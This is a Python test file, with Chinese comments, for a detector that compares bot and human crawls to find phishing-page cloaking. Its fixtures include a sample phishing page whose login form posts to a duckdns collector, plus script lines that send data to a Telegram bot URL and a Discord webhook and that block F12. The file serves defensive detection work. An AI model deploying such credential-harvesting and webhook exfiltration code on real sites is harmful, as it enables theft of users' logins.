"""
test_node4_cloaking.py — Node 4 雙瀏覽器布林判定自檢
執行: python test_node4_cloaking.py

不需要網路：直接餵造好的 BOT / HUMAN 爬取結果給 decide_cloaking。
"""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from nodes.node4_cloaking_analyzer import (
    decide_cloaking, _assess_dynamic_reliability, _detect_gates,
)

URL = "https://portal-update.example.com/signin"

# 爬蟲看到的：乾淨的佔位頁，沒有任何惡意機制
CLEAN = """
<html><body><h1>Welcome</h1>
<p>Our service is currently under maintenance. Please check back later.</p>
</body></html>
"""

# 真人看到的：完整釣魚頁（表單送往免費主機 + Telegram 外洩 + 封鎖 F12）
MALICIOUS = """
<html><body oncontextmenu="return false;">
<form action="https://collector-9x.duckdns.org/next.php" method="post">
  <input type="text" name="email"><input type="password" name="password">
</form>
<script>
document.getElementById('password').value;
document.querySelector('[type="password"]');
fetch('https://api.telegram.org/bot123456789:AAFvE7xxxxxxxxxxxxxxxxxxxxxxxxxxxxx/sendMessage?chat_id=1');
document.onkeydown = function(e){ if(e.keyCode === 123) return false; };
</script></body></html>
"""


def _r(html, *, status=200, error=None, chain=None, text=None):
    return {
        "html": html, "status_code": status, "error": error,
        "text_content": text if text is not None else ("x" * 200 if html else ""),
        "html_length": len(html), "redirect_chain": chain or [URL],
        "title": "", "final_url": URL,
    }


def test_bot_clean_human_malicious_is_cloaking():
    """核心情境：爬蟲拿到乾淨頁，真人拿到釣魚頁"""
    v = decide_cloaking(_r(CLEAN), _r(MALICIOUS), URL)
    assert v["verified"], v["evidence"]
    assert "C1" in v["fired"], v["fired"]
    assert not v["bot_mechanisms"], f"BOT 端不該有惡意機制: {v['bot_mechanisms']}"
    assert "webhook_exfiltration" in v["hidden_from_bot"], v["hidden_from_bot"]
    assert v["human_eval"]["is_phishing"] and not v["bot_eval"]["is_phishing"]


def test_both_malicious_is_phishing_not_cloaking():
    """兩端都給釣魚頁 → 是釣魚，但沒有對爬蟲隱藏，不算 Cloaking"""
    v = decide_cloaking(_r(MALICIOUS), _r(MALICIOUS), URL)
    assert not v["verified"], v["evidence"]
    assert not v["hidden_from_bot"]
    assert any("未對爬蟲隱藏" in e for e in v["evidence"]), v["evidence"]


def test_both_clean_is_not_cloaking():
    v = decide_cloaking(_r(CLEAN), _r(CLEAN), URL)
    assert not v["verified"]
    assert any("兩端皆未偵測到惡意機制" in e for e in v["evidence"]), v["evidence"]


def test_text_difference_alone_is_not_cloaking():
    """關鍵回歸：文字完全不同但兩端都沒有惡意機制 → 舊版相似度法會誤報"""
    zh = "<html><body><h1>歡迎光臨</h1><p>本站提供最新產品資訊與線上訂購服務。</p></body></html>"
    en = "<html><body><h1>Welcome</h1><p>Latest products and online ordering.</p></body></html>"
    v = decide_cloaking(_r(zh, text="歡迎光臨 本站提供最新產品資訊與線上訂購服務。"),
                        _r(en, text="Welcome Latest products and online ordering."), URL)
    assert v["content_similarity"] < 0.5, v["content_similarity"]
    assert not v["verified"], f"多語言頁面被誤判為 Cloaking: {v['evidence']}"


def test_identical_text_with_hidden_mechanism_is_cloaking():
    """關鍵回歸：文字幾乎相同但真人端多一支外洩腳本 → 舊版相似度法會漏報"""
    base = "<html><body><h1>Sign in</h1><p>Enter your credentials below.</p>{}</body></html>"
    bot   = base.format("")
    human = base.format(
        "<script>fetch('https://discord.com/api/webhooks/1/abc');</script>")
    v = decide_cloaking(_r(bot, text="Sign in Enter your credentials below."),
                        _r(human, text="Sign in Enter your credentials below."), URL)
    assert v["content_similarity"] > 0.95, v["content_similarity"]
    assert v["verified"], f"高相似度的隱藏機制未被抓到: {v['evidence']}"
    assert "webhook_exfiltration" in v["hidden_from_bot"]


def test_bot_blocked_is_cloaking():
    v = decide_cloaking(_r("", status=403), _r(CLEAN, status=200), URL)
    assert v["verified"] and "C2" in v["fired"], v["evidence"]


def test_redirect_fork_without_mechanism_diff_is_not_cloaking():
    """地理導向：分叉但兩端機制相同 → 不判 Cloaking"""
    # _redirect_forked 比的是網域，不是路徑
    v = decide_cloaking(
        _r(CLEAN, chain=[URL, "https://us.example.com/home"]),
        _r(CLEAN, chain=[URL, "https://tw.example.com/home"]), URL)
    assert not v["verified"], v["evidence"]
    assert any("地理/裝置導向" in e for e in v["evidence"]), v["evidence"]


# ── 互動閘門：「沒測到」不可以講成「測過沒有」────────────────────────
# CrawlPhish (S&P'21) Table V：User Interaction 類佔客戶端 cloaking 實作 57.60%。
# 這類閘門對 BOT / HUMAN 是對稱的，機制集合差為空，但爬取本身「很健康」，
# 若不特判就會拿到 HIGH，Node 5 因而輸出 cloaking=False（謊稱已確認無 cloaking）。

# 兩端都只看到 CAPTCHA 閘門，真正的內容在閘門後面，我們沒看到
GATED = """
<html><body>
<h1>Verify you are human</h1>
<div class="g-recaptcha" data-sitekey="6Lxxxxxxxxxxxxxxxxxxxxx"></div>
<script src="https://www.google.com/recaptcha/api.js"></script>
</body></html>
"""


def _healthy(html):
    """爬取本身健康（有內容、耗時足夠、預熱成功）——刻意讓它有資格拿 HIGH"""
    r = _r(html)
    r.update(fetch_time_sec=9.0, prewarm_ok=True)
    return r


def test_gated_page_downgrades_to_low_not_high():
    """兩端皆無機制 + 頁面有 CAPTCHA 閘門 → LOW（Node 5 輸出 N/A），不可為 HIGH"""
    rel = _assess_dynamic_reliability(_healthy(GATED), _healthy(GATED),
                                      no_mechanisms=True)
    assert rel == "LOW", f"應降級為 LOW，實得 {rel}"


def test_clean_page_without_gate_stays_high():
    """乾淨網站沒有閘門 → 維持 HIGH，才能誠實輸出 False（確認無 cloaking）"""
    rel = _assess_dynamic_reliability(_healthy(CLEAN), _healthy(CLEAN),
                                      no_mechanisms=True)
    assert rel == "HIGH", f"不該降級，實得 {rel}"


def test_gate_does_not_suppress_a_real_detection():
    """閘門存在但確實測到機制差 → 不降級（no_mechanisms=False），仍可 CONFIRMED"""
    rel = _assess_dynamic_reliability(_healthy(GATED), _healthy(MALICIOUS),
                                      no_mechanisms=False)
    assert rel == "HIGH", f"有機制差時不該因閘門降級，實得 {rel}"
    v = decide_cloaking(_r(GATED), _r(MALICIOUS), URL)
    assert v["verified"] and "C1" in v["fired"], v["evidence"]


def test_crossed_gates_no_longer_count_as_unseen():
    """跨過去的閘門不該再拖低可信度，否則加了跨閘門功能反而更多案例掉進 N/A"""
    clk = '<button onclick="document.getElementById(1).style.display=\'block\'">x</button>'
    alr = '<script>alert(1)</script>'
    assert _detect_gates(clk, []) == ["click_gate"]
    assert _detect_gates(clk, ["click:continue"]) == []
    assert _detect_gates(alr, []) == ["alert_gate"]
    assert _detect_gates(alr, ["dialog_auto_accept"]) == []


def test_captcha_never_counts_as_crossed():
    """CAPTCHA 刻意不破解（法律/倫理＋PhishDecloaker 等級的工作量）→ 永遠算未跨越"""
    cap = '<div class="g-recaptcha"></div>'
    assert _detect_gates(cap, ["click:continue", "dialog_auto_accept"]) == ["captcha"]


def test_gate_crossing_never_touches_forms():
    """
    安全鎖（不可放寬）：分析的是釣魚站，誤點表單內元素等於代替受害者送出資料。
    這裡直接檢查探針 JS 有無安全鎖，避免日後改動把鎖拿掉。
    """
    from nodes.dual_crawler import _GATE_PROBE_JS, _FORBIDDEN_TEXTS
    assert "closest('form')" in _GATE_PROBE_JS, "缺少『表單內元素不點』的安全鎖"
    assert "'submit'" in _GATE_PROBE_JS, "缺少『submit 型別不點』的安全鎖"
    assert "badTexts" in _GATE_PROBE_JS, "缺少送出語意字樣的黑名單檢查"
    for word in ("sign in", "submit", "pay", "登入", "送出", "付款"):
        assert word in _FORBIDDEN_TEXTS, f"黑名單缺少 {word}"


def test_gate_patterns_cover_crawlphish_categories():
    """CrawlPhish 的 User Interaction 各子類都要能被認出來"""
    cases = {
        "captcha":      '<div class="g-recaptcha"></div>',
        "notification": '<script>Notification.requestPermission()</script>',
        "alert_gate":   '<script>alert("please wait")</script>',
        "click_gate":   '<button onclick="document.getElementById(\'x\').style.display=\'block\'">Continue</button>',
    }
    for name, html in cases.items():
        assert name in _detect_gates(html), f"{name} 未被偵測: {html}"
    assert _detect_gates(CLEAN) == [], "乾淨頁不該誤判有閘門"


# ── C1 陽性確認：擋掉頁面自身變異造成的假陽性 ──────────────────────
# Cloak of Visibility (S&P'16) 每 profile 爬 3 次做變異度基線；我們比的是離散
# 機制集合，只需在「即將宣稱有 cloaking 且僅由 C1 支撐」時重爬一次確認。

def _c1_setup():
    from nodes.node3_phishing_classifier import evaluate_page
    bot_mech = evaluate_page(CLEAN, URL)["mechanisms"]
    hidden   = sorted(evaluate_page(MALICIOUS, URL)["mechanisms"] - bot_mech)
    assert hidden, "測試前提：HUMAN 應有 BOT 沒有的機制"
    return bot_mech, hidden


def _c1_with_recrawl(fake_result):
    """把 crawl_human_only 換掉，不連網測 _confirm_c1"""
    import nodes.dual_crawler as dc
    from nodes.node4_cloaking_analyzer import _confirm_c1
    bot_mech, hidden = _c1_setup()
    orig = dc.crawl_human_only
    dc.crawl_human_only = lambda u: fake_result
    try:
        return _confirm_c1(URL, bot_mech, hidden, True, [])
    finally:
        dc.crawl_human_only = orig


def test_c1_confirmed_when_mechanism_reappears():
    v, ev = _c1_with_recrawl({"html": MALICIOUS, "error": None})
    assert v is True, ev
    assert any("穩定重現" in e for e in ev), ev


def test_c1_revoked_when_mechanism_does_not_reappear():
    """機制沒重現 → 是頁面自身變異（輪播/A-B test），撤銷 cloaking 判定"""
    v, ev = _c1_with_recrawl({"html": CLEAN, "error": None})
    assert v is False, ev
    assert any("頁面自身變異" in e for e in ev), ev


def test_c1_recrawl_failure_keeps_original_verdict():
    """重爬失敗不該把真陽性抹掉 —— 確認機制是為了擋誤判，不是製造漏報"""
    v, ev = _c1_with_recrawl({"html": "", "error": "timeout"})
    assert v is True, ev
    assert any("保守維持" in e for e in ev), ev


def test_human_profiles_all_wellformed():
    """每個 HUMAN profile 都要有極端化所需的核心欄位，且 UA 不得是爬蟲"""
    from nodes.dual_crawler import HUMAN_PROFILES, BOT_CONTEXT_OPTIONS
    for name, p in HUMAN_PROFILES.items():
        for key in ("user_agent", "locale", "timezone_id", "viewport"):
            assert key in p, f"{name} 缺少 {key}"
        assert "bot" not in p["user_agent"].lower(), f"{name} 的 UA 不該像爬蟲"
        assert p["user_agent"] != BOT_CONTEXT_OPTIONS["user_agent"], \
            f"{name} 與 BOT 的 UA 相同，失去極端化意義"
        assert "Accept-Language" in p["extra_http_headers"], \
            f"{name} 缺 Accept-Language（BOT 刻意不設，這是分離維度之一）"


def test_bot_and_human_proxies_are_separable():
    """IP 要能成為極端化維度：兩端可各自設定出口"""
    from nodes.dual_crawler import _proxy_for
    import nodes.dual_crawler as dc
    ob, oh = dc.BOT_PROXY_URL, dc.HUMAN_PROXY_URL
    try:
        dc.BOT_PROXY_URL, dc.HUMAN_PROXY_URL = "http://dc-proxy:1", "http://res-proxy:2"
        assert _proxy_for(False) == "http://dc-proxy:1"
        assert _proxy_for(True) == "http://res-proxy:2"
    finally:
        dc.BOT_PROXY_URL, dc.HUMAN_PROXY_URL = ob, oh


if __name__ == "__main__":
    for fn in (test_bot_clean_human_malicious_is_cloaking,
               test_both_malicious_is_phishing_not_cloaking,
               test_both_clean_is_not_cloaking,
               test_text_difference_alone_is_not_cloaking,
               test_identical_text_with_hidden_mechanism_is_cloaking,
               test_bot_blocked_is_cloaking,
               test_redirect_fork_without_mechanism_diff_is_not_cloaking,
               test_gated_page_downgrades_to_low_not_high,
               test_clean_page_without_gate_stays_high,
               test_gate_does_not_suppress_a_real_detection,
               test_crossed_gates_no_longer_count_as_unseen,
               test_captcha_never_counts_as_crossed,
               test_gate_crossing_never_touches_forms,
               test_gate_patterns_cover_crawlphish_categories,
               test_c1_confirmed_when_mechanism_reappears,
               test_c1_revoked_when_mechanism_does_not_reappear,
               test_c1_recrawl_failure_keeps_original_verdict,
               test_human_profiles_all_wellformed,
               test_bot_and_human_proxies_are_separable):
        fn()
        print(f"PASS  {fn.__name__}")
